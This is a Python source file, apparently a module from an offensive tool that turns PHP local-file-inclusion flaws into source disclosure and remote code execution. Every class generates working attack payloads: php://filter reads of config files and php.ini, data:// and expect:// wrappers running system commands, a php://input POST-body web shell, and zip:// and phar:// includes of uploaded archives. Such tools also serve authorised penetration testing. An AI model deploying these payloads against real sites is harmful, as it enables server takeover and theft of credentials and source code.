"""PHP wrappers — paths from LFI to RCE / source disclosure.

Techniques:
  * php://filter/convert.base64-encode  -> source disclosure (FilterReadModule),
  * data://text/plain;base64,           -> RCE (requires allow_url_include),
  * php://input                          -> RCE via POST body,
  * expect://                            -> direct command execution,
  * zip:// , phar://                     -> RCE from an uploaded "image".

RCE payloads inject the INCLUDED_RCE_OK marker into the command so
detection can unambiguously confirm execution (marker echo).
"""
from __future__ import annotations

import base64
from collections.abc import Iterator

from ..config import Encoding
from ..detection import RCE_MARKER
from ..http_client import HttpClient, Response
from ..detection import Finding
from .base import BaseModule


def _b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


# Command that always emits the marker (echo) plus the real cfg.cmd output on Linux.
def _cmd_with_marker(cmd: str) -> str:
    return f"echo {RCE_MARKER}; {cmd}"


class FilterReadModule(BaseModule):
    """Read file sources as base64 (no code execution)."""
    name = "filter_read"
    description = "php://filter/convert.base64-encode — source dump"
    expect_base64 = True

    # Common valuable sources in a whitebox scenario + php.ini for config checks.
    _SOURCES = [
        "index", "config", "configure", "config.php", "db", "database",
        "../config", "/var/www/html/config.php",
        "../../../../etc/php/7.4/apache2/php.ini",
        "../../../../etc/php/8.1/apache2/php.ini",
    ]

    def _sources(self) -> list[str]:
        if self.cfg.target_file:
            return [self.cfg.target_file]
        return self._SOURCES

    def payloads(self) -> Iterator[str]:
        for res in self._sources():
            yield f"php://filter/convert.base64-encode/resource={res}"
            yield f"php://filter/read=convert.base64-encode/resource={res}"


class DataWrapperModule(BaseModule):
    """data:// — RCE when allow_url_include=On."""
    name = "data"
    description = "data://text/plain;base64 — RCE (allow_url_include)"

    def payloads(self) -> Iterator[str]:
        php = f"<?php system('{_cmd_with_marker(self.cfg.cmd)}'); ?>"
        b64 = _b64(php)
        yield f"data://text/plain;base64,{b64}"
        yield f"data://text/plain,{php}"


class ExpectWrapperModule(BaseModule):
    """expect:// — direct command execution (if the extension is loaded)."""
    name = "expect"
    description = "expect:// — direct command execution"

    def payloads(self) -> Iterator[str]:
        yield f"expect://{_cmd_with_marker(self.cfg.cmd)}"


class InputWrapperModule(BaseModule):
    """php://input — web shell in the POST body.

    Overrides run(): the payload goes as the body, the command is baked
    into it. Requires the vulnerable parameter to accept POST.
    """
    name = "input"
    description = "php://input — RCE via POST body (allow_url_include)"
    verifiable = False  # custom run(): payload string alone can't be replayed

    def payloads(self) -> Iterator[str]:
        yield "php://input"

    async def run(self, client: HttpClient) -> list[Finding]:
        # Hardcode the command in the payload (not every target reads GET).
        php = f"<?php system('{_cmd_with_marker(self.cfg.cmd)}'); ?>"
        # Temporarily swap the body for the web shell.
        orig_data, orig_method = client.cfg.data, client.cfg.method
        client.cfg.data = php
        client.cfg.method = "POST"
        try:
            resp = await client.send("php://input", encoding=Encoding.NONE)
        finally:
            client.cfg.data, client.cfg.method = orig_data, orig_method
        finding = self.evaluate(resp)
        if self.cfg.verbose:
            print(f"    [{resp.status}] {resp.length:>7}B  php://input (POST body web shell)")
        return [finding] if finding.confirmed else []


class ZipPharModule(BaseModule):
    """zip:// and phar:// — RCE from an uploaded "image" file.

    Requires a known path to the uploaded archive (--file points to it).
    Skeleton: generates include payloads; crafting/uploading the archive
    itself is a separate step (covered elsewhere).
    """
    name = "zip_phar"
    description = "zip:// and phar:// — include an uploaded archive (pass --file)"

    def payloads(self) -> Iterator[str]:
        if not self.cfg.target_file:
            return  # nothing to do without a path to the archive
        archive = self.cfg.target_file
        yield f"zip://{archive}%23shell.php"
        yield f"phar://{archive}%2Fshell.txt"
